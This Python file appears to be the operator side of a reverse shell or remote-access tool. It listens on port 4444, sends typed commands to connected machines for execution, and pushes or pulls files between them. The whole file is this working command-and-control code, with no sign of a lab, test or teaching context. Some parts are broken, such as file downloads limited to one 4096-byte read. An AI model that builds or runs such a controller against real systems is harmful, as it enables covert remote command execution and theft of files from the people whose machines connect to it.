# server.py
import socket
import base64
import threading

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        self.clients = []
        
    def start(self):
        print(f"[*] Listening on {self.host}:{self.port}")
        
        while True:
            client, addr = self.socket.accept()
            print(f"[+] Accepted connection from {addr[0]}:{addr[1]}")
            self.clients.append((client, addr))
            client_handler = threading.Thread(target=self.handle_client, args=(client, addr))
            client_handler.start()
    
    def handle_client(self, client, addr):
        while True:
            try:
                command = input(f"{addr[0]}@{addr[1]}# ")
                
                if not command:
                    continue
                
                if command == "help":
                    self.show_help()
                    continue
                
                if command.startswith("upload "):
                    parts = command.split(maxsplit=1)
                    if len(parts) < 2:
                        print("[-] Usage: upload <local_path> <remote_path>")
                        continue
                    
                    paths = parts[1].split(maxsplit=1)
                    if len(paths) < 2:
                        print("[-] Usage: upload <local_path> <remote_path>")
                        continue
                    
                    local_path = paths[0]
                    remote_path = paths[1]
                    
                    try:
                        with open(local_path, "rb") as file:
                            file_data = file.read()
                        client.send(f"upload {remote_path}".encode('utf-8'))
                        client.send(base64.b64encode(file_data))
                        response = client.recv(1024).decode('utf-8')
                        print(response)
                    except Exception as e:
                        print(f"[-] Error uploading file: {e}")
                    continue
                
                if command.startswith("download "):
                    parts = command.split(maxsplit=1)
                    if len(parts) < 2:
                        print("[-] Usage: download <remote_path> <local_path>")
                        continue
                    
                    paths = parts[1].split(maxsplit=1)
                    if len(paths) < 2:
                        print("[-] Usage: download <remote_path> <local_path>")
                        continue
                    
                    remote_path = paths[0]
                    local_path = paths[1]
                    
                    client.send(f"download {remote_path}".encode('utf-8'))
                    file_data = client.recv(4096)
                    
                    try:
                        with open(local_path, "wb") as file:
                            file.write(base64.b64decode(file_data))
                        print(f"[+] File downloaded to {local_path}")
                    except Exception as e:
                        print(f"[-] Error downloading file: {e}")
                    continue
                
                client.send(command.encode('utf-8'))
                
                if command == "exit":
                    client.close()
                    self.clients.remove((client, addr))
                    print(f"[-] Connection from {addr[0]}:{addr[1]} closed")
                    break
                
                response = client.recv(4096).decode('utf-8')
                print(response)
            except Exception as e:
                print(f"[-] Error: {e}")
                client.close()
                self.clients.remove((client, addr))
                break
    
    def show_help(self):
        print("\nAvailable commands:")
        print("  help                - Show this help message")
        print("  cd <directory>      - Change directory")
        print("  download <r> <l>    - Download file from remote path <r> to local path <l>")
        print("  upload <l> <r>      - Upload file from local path <l> to remote path <r>")
        print("  exit                - Close the connection")
        print("  Any other command   - Execute on the remote system\n")

if __name__ == "__main__":
    # Change these to your server's IP and port
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 4444
    
    server = Server(SERVER_HOST, SERVER_PORT)
    server.start()